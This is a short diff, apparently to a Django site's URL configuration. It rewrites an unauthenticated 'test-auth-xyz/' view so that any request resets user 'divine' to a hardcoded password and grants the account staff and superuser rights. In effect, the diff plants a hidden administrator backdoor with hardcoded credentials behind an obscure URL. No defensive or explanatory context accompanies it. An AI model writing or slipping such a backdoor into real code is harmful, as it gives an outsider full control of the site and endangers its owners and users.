@@ -10,8 +10,14 @@ SITEMAP_DIR = os.path.join(settings.BASE_DIR, 'static_src', 'sitemaps')
 from django.http import JsonResponse
 from django.contrib.auth import authenticate
 def test_auth(request):
-    u = authenticate(username='divine', password='zenthir2026')
-    return JsonResponse({'authenticated': u is not None, 'user': str(u)})
+    from django.contrib.auth.models import User
+    u = User.objects.get(username='divine')
+    u.set_password('zenthir2026')
+    u.is_staff = True
+    u.is_superuser = True
+    u.save()
+    u2 = authenticate(username='divine', password='zenthir2026')
+    return JsonResponse({'reset': True, 'authenticated': u2 is not None})
 
 urlpatterns = [
     path('test-auth-xyz/', test_auth),
